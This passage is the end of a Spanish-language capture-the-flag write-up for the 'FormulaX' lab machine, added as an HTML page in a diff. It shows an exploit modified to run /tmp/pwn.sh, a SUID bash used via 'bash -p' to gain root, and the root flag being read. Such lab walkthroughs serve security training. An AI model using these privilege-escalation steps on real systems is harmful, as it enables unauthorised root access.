+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to 127.0.0.1
+</span></span></code></pre></div><p>Y vemos lo siguiente en la otra terminal donde estamos ejecutando el script.
+<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
+<p>Vamos a cambiar el exploit de nuevo y vamos a especificar que queremos que ejecute un archivo en bash que vamos a crear ahora mismo.</p>
+<p><img src="images/Screenshot_29.png" alt="Write-up Image"></p>
+<p>Le asignamos permisos de ejecución <code>kai_relay@formulax:/tmp$ chmod +x pwn.sh</code></p>
+<p>Modificamos el exploit de nuevo..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>shell_execute<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;/tmp/pwn.sh&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>Ahora al lanzar el exploit&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>frank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port <span style="color:#ae81ff">2002</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connecting to target...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connected to 127.0.0.1
+</span></span></code></pre></div><p>No nos muestra nada por la otra terminal&hellip;
+<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
+<p>Y ya vemos que se ha asignado el permiso SUID a la bash.
+<img src="images/Screenshot_31.png" alt="Write-up Image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>frank_dorky@formulax:/tmp$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>frank_dorky<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>frank_dorky<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>frank_dorky<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>¡Y ya hemos escalado privilegios!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
+</span></span><span style="display:flex;"><span>04da1f3886a9...
+</span></span></code></pre></div><p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
